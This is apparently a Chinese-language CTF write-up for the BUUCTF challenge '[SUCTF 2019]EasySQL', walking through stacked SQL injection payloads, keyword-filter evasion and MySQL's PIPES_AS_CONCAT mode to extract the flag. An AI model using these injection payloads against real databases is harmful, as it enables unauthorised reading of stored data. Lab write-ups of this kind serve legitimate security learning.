---
layout:     post               # 使用的布局（不需要改）
title:      [SUCTF 2019]EasySQL1   # 标题 
subtitle:    buuctf  #副标题
date:       2020-07-30        # 时间
author:     yanmie             # 作者
header-img: img/.jpg    ##标签这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               
    - CTF
  
--- 

攻防世界登录密码错误次数太多了，封禁帐号了。。。暂且刷几道buuctf的题。

打开环境，

![auB3sH.png](https://s1.ax1x.com/2020/07/30/auB3sH.png)

输入0以外的数字查询，回显

	Array ( [0] => 1 ) 

输入0和其他字符页面无回显。

输入`from`、`update`、`where`、`union`、`and`、`or`等字符串，页面回显

	Nonono.

很明显被过滤了。

联合注入，盲注显然不能了。

尝试堆叠注入。

输入`1;show databases; #`，页面回显

	Array ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test ) 

可以进行堆叠注入。

输入`1;show tables; #`页面回显：

	Array ( [0] => 1 ) Array ( [0] => Flag ) 

flag应该就在flag表里。

输入`1;show columns from flag; #`查字段，但页面回显Nonono.

。。。。。因为flag和from被过滤了。

尝试一下预处理，发现不可行，超过一定长度页面会显示

	Too long.

网上查了查wp.

这里要猜测后端查询表语句。

我们需要根据输入数据返回的特征，猜出SQL语句大概是这样：

	select $_POST['query'] || flag from flag

这里`||`后的flag字段必须是表里有的字段。

**知识点**：

oracle 支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 不支持。

在mysql里，不设置相关参数的话它只是个 `或运算` 的符号。

或运算符有真则为真，字符视为假.

```
mysql> select 1 || user from users;
+-----------+
| 1 || user |
+-----------+
|         1 |
|         1 |
|         1 |
|         1 |
|         1 |
+-----------+
5 rows in set (0.00 sec)

mysql> select 0 || user from users;
+-----------+
| 0 || user |
+-----------+
|         0 |
|         0 |
|         1 |
|         0 |
|         0 |
+-----------+
5 rows in set, 4 warnings (0.00 sec)
```

但是我们可以通过设置 sql_mode=pipes_as_concat; 来使  ||  用作拼接的作用。sql_mode是一组mysql支持的基本语法及校验规则，查询当前系统sql_mode的设置:select @@sql_mode;设置用set @@sql_mode=" "；

sql_mode参数看[这里](https://blog.csdn.net/weixin_42373127/article/details/88866710)

```
mysql> set sql_mode=PIPES_AS_CONCAT;select 1 || user from users;
Query OK, 0 rows affected, 1 warning (0.00 sec)

+-----------+
| 1 || user |
+-----------+
| 1admin    |
| 1gordonb  |
| 11337     |
| 1pablo    |
| 1smithy   |
+-----------+
5 rows in set (0.00 sec)

mysql> set sql_mode=PIPES_AS_CONCAT;select 0 || user from users;
Query OK, 0 rows affected (0.00 sec)

+-----------+
| 0 || user |
+-----------+
| 0admin    |
| 0gordonb  |
| 01337     |
| 0pablo    |
| 0smithy   |
+-----------+
5 rows in set (0.00 sec)

mysql>
```

继续解题：

`1;set sql_mode=PIPES_AS_CONCAT;select 1` ,这里后边的`select 1`又拼接了原本的sql语句，页面回显：

	Array ( [0] => 1 ) Array ( [0] => 1flag{e74e5597-a34d-4e63-8a7c-b84fdbf9eb2e} ) 

另一种解法们这里没过滤`*`,输入`*,1`,回显：

	Array ( [0] => flag{e74e5597-a34d-4e63-8a7c-b84fdbf9eb2e} [1] => 1 ) 

